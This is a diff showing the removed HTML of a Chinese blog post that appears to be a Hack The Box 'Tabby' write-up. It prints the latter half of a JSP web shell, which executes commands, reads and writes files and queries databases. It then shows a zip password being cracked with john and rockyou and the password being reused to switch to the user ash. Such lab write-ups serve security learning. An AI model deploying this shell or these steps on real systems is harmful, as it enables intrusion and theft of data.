-        while (r.next()) {
-            sb.append(r.getString(1) + &quot;\t&quot;);
-        }
-        r.close();
-        c.close();
-    }
- 
-    void OO(String s, StringBuffer sb) throws Exception {
-        Connection c = GC(s);
-        String[] t = { &quot;TABLE&quot; };
-        ResultSet r = c.getMetaData().getTables(null, null, &quot;%&quot;, t);
-        while (r.next()) {
-            sb.append(r.getString(&quot;TABLE_NAME&quot;) + &quot;\t&quot;);
-        }
-        r.close();
-        c.close();
-    }
- 
-    void PP(String s, StringBuffer sb) throws Exception {
-        String[] x = s.trim().split(&quot;\r\n&quot;);
-        Connection c = GC(s);
-        Statement m = c.createStatement(1005, 1007);
-        ResultSet r = m.executeQuery(&quot;select * from &quot; + x[3]);
-        ResultSetMetaData d = r.getMetaData();
-        for (int i = 1; i &lt;= d.getColumnCount(); i++) {
-            sb.append(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)
-                    + &quot;)\t&quot;);
-        }
-        r.close();
-        m.close();
-        c.close();
-    }
- 
-    void QQ(String cs, String s, String q, StringBuffer sb) throws Exception {
-        int i;
-        Connection c = GC(s);
-        Statement m = c.createStatement(1005, 1008);
-        try {
-            ResultSet r = m.executeQuery(q);
-            ResultSetMetaData d = r.getMetaData();
-            int n = d.getColumnCount();
-            for (i = 1; i &lt;= n; i++) {
-                sb.append(d.getColumnName(i) + &quot;\t|\t&quot;);
-            }
-            sb.append(&quot;\r\n&quot;);
-            while (r.next()) {
-                for (i = 1; i &lt;= n; i++) {
-                    sb.append(EC(r.getString(i), cs) + &quot;\t|\t&quot;);
-                }
-                sb.append(&quot;\r\n&quot;);
-            }
-            r.close();
-        } catch (Exception e) {
-            sb.append(&quot;Result\t|\t\r\n&quot;);
-            try {
-                m.executeUpdate(q);
-                sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);
-            } catch (Exception ee) {
-                sb.append(ee.toString() + &quot;\t|\t\r\n&quot;);
-            }
-        }
-        m.close();
-        c.close();
-    }%&gt;
-      
-      
-&lt;%
-    String cs = request.getParameter(&quot;z0&quot;)==null?&quot;gbk&quot;: request.getParameter(&quot;z0&quot;) + &quot;&quot;;
-    request.setCharacterEncoding(cs);
-    response.setContentType(&quot;text/html;charset=&quot; + cs);
-    String Z = EC(request.getParameter(Pwd) + &quot;&quot;, cs);
-    String z1 = EC(request.getParameter(&quot;z1&quot;) + &quot;&quot;, cs);
-    String z2 = EC(request.getParameter(&quot;z2&quot;) + &quot;&quot;, cs);
-    StringBuffer sb = new StringBuffer(&quot;&quot;);
-    try {
-        sb.append(&quot;-&gt;&quot; + &quot;|&quot;);
-        if (Z.equals(&quot;A&quot;)) {
-            String s = new File(application.getRealPath(request
-                    .getRequestURI())).getParent();
-            sb.append(s + &quot;\t&quot;);
-            if (!s.substring(0, 1).equals(&quot;/&quot;)) {
-                AA(sb);
-            }
-        } else if (Z.equals(&quot;B&quot;)) {
-            BB(z1, sb);
-        } else if (Z.equals(&quot;C&quot;)) {
-            String l = &quot;&quot;;
-            BufferedReader br = new BufferedReader(
-                    new InputStreamReader(new FileInputStream(new File(
-                            z1))));
-            while ((l = br.readLine()) != null) {
-                sb.append(l + &quot;\r\n&quot;);
-            }
-            br.close();
-        } else if (Z.equals(&quot;D&quot;)) {
-            BufferedWriter bw = new BufferedWriter(
-                    new OutputStreamWriter(new FileOutputStream(
-                            new File(z1))));
-            bw.write(z2);
-            bw.close();
-            sb.append(&quot;1&quot;);
-        } else if (Z.equals(&quot;E&quot;)) {
-            EE(z1);
-            sb.append(&quot;1&quot;);
-        } else if (Z.equals(&quot;F&quot;)) {
-            FF(z1, response);
-        } else if (Z.equals(&quot;G&quot;)) {
-            GG(z1, z2);
-            sb.append(&quot;1&quot;);
-        } else if (Z.equals(&quot;H&quot;)) {
-            HH(z1, z2);
-            sb.append(&quot;1&quot;);
-        } else if (Z.equals(&quot;I&quot;)) {
-            II(z1, z2);
-            sb.append(&quot;1&quot;);
-        } else if (Z.equals(&quot;J&quot;)) {
-            JJ(z1);
-            sb.append(&quot;1&quot;);
-        } else if (Z.equals(&quot;K&quot;)) {
-            KK(z1, z2);
-            sb.append(&quot;1&quot;);
-        } else if (Z.equals(&quot;L&quot;)) {
-            LL(z1, z2);
-            sb.append(&quot;1&quot;);
-        } else if (Z.equals(&quot;M&quot;)) {
-            String[] c = { z1.substring(2), z1.substring(0, 2), z2 };
-            Process p = Runtime.getRuntime().exec(c);
-            MM(p.getInputStream(), sb);
-            MM(p.getErrorStream(), sb);
-        } else if (Z.equals(&quot;N&quot;)) {
-            NN(z1, sb);
-        } else if (Z.equals(&quot;O&quot;)) {
-            OO(z1, sb);
-        } else if (Z.equals(&quot;P&quot;)) {
-            PP(z1, sb);
-        } else if (Z.equals(&quot;Q&quot;)) {
-            QQ(cs, z1, z2, sb);
-        }
-    } catch (Exception e) {
-        sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString());
-    }
-    sb.append(&quot;|&quot; + &quot;&lt;-&quot;);
-    out.print(sb.toString());
-%&gt;
-</code></pre><h3 id="提权">提权</h3>
-<h4 id="爆破web路径压缩包密码">爆破web路径压缩包密码</h4>
-<p>翻看他的web路径/var/www/html，在file文件夹下有一个加密的压缩包</p>
-<p>蚁剑下载下来本地破解下密码；</p>
-<p>。。。尝试了很多方法，跑了很久跑不出来，，最后还是去翻了wp，使用kali自带的/usr/share/wordlists/rockyou.txt.gz字典进行破解：</p>
-<p>解压字典：</p>
-<pre><code>root@wh1sper:/usr/share/wordlists# ls
-dirb  dirbuster  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt.gz  wfuzz
-root@wh1sper:/usr/share/wordlists# gzip -d rockyou.txt.gz 
-root@wh1sper:/usr/share/wordlists# ls
-dirb  dirbuster  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt  wfuzz
-</code></pre><p>开始爆破：</p>
-<pre><code>root@wh1sper:~/HTB/machine/Tabby# john zippass.txt --wordlist=/usr/share/wordlists/rockyou.txt
-Using default input encoding: UTF-8
-Loaded 1 password hash (PKZIP [32/64])
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-admin@it         (1.zip)
-1g 0:00:00:00 DONE (2020-07-21 07:47) 1.562g/s 16192Kp/s 16192Kc/s 16192KC/s adnc153..adenabuck
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-Session completed
-root@wh1sper:~/HTB/machine/Tabby#
-</code></pre><p>，，，秒出，使用密码 <code>admin@it</code> 解压。</p>
-<h4 id="提权ash用户">提权ash用户</h4>
-<p>不过解压出来之后我们并不能发现压缩包里面有什么特别的，之前读取/etc/passwd的时候我们看到了有个ash用户，于是尝试用这个密码来登录ash用户：</p>
-<pre><code>su ash
-Password: admin@it
-id
-uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
-</code></pre><p>果然可以成功！/home/user.txt就可以拿到手了</p>
-
-</section>
-
-
-    <footer class="article-footer">
-    
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under CC BY-NC-SA 4.0</span>
-    </section>
-    </footer>
-
-    
-</article>
-
-    <aside class="related-contents--wrapper">
-    
-    
-</aside>
-
-
-    
-        
-    <div class="disqus-container">
-    <div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</div>
-
-<style>
-    .disqus-container {
-        background-color: var(--card-background);
-        border-radius: var(--card-border-radius);
-        box-shadow: var(--shadow-l1);
-        padding: var(--card-padding);
-    }
-</style>
-
-<script>
-    window.addEventListener('onColorSchemeChange', (e) => {
-        if (DISQUS) {
-            DISQUS.reset({
-                reload: true
-            });
-        }
-    })
-</script>
-
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2020 - 
-        
-        2021 wh1sper
-    </section>
-    
-    <section class="powerby">
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
-    </section>
-</footer>
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
-            >
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
-                defer="false"
-                >
-            </script><script type="text/javascript" src="/ts/main.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-
-    </body>
-</html>
